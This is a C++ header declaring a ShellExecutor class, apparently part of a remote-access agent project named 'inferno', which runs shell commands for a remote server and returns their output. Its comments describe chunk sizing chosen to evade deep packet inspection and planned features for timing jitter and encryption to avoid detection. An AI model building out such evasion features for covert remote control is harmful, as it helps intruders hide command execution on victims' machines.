#pragma once

#include <string>

namespace inferno {

/**
 * @brief ShellExecutor - Remote Shell Engine (Circle 3: Gourmandise)
 *
 * Responsible for executing a shell command on behalf of the Server and
 * returning its complete output. Uses popen() for simplicity and correctness.
 *
 * Design Notes:
 * - Output is read in 4096-byte chunks matching the system page size.
 *   This mirrors libc, SSH, and HTTPS buffer sizes to avoid DPI fingerprinting.
 *
 * TODO(Circle 7 - Violence): Replace popen() with a non-blocking pipe integrated
 *   into the Agent's select() loop to support long-running commands without
 *   stalling the main event loop.
 */
class ShellExecutor {
public:
    struct Result {
        std::string output;  // Full combined stdout+stderr
        bool        success; // true if exit code == 0
    };

    // Coplien Canonical Form
    ShellExecutor()                              = default;
    ~ShellExecutor()                             = default;
    ShellExecutor(const ShellExecutor&)          = delete;
    ShellExecutor& operator=(const ShellExecutor&) = delete;

    /**
     * @brief Executes a shell command and captures its output.
     * @param command  The shell command string to execute.
     * @return         A Result containing the full output and success flag.
     */
    Result execute(const std::string& command) const;

    // Output chunk size: 4096 bytes (system page size).
    // Chosen to match libc/SSH/HTTPS buffer sizes for stealth traffic profiling.
    // TODO(Circle 7): Add randomized inter-chunk jitter for timing fingerprint evasion.
    // TODO(Circle 8): Wrap output in AES-256-GCM for DPI content inspection resistance.
    static constexpr size_t CHUNK_SIZE = 4096;
};

} // namespace inferno
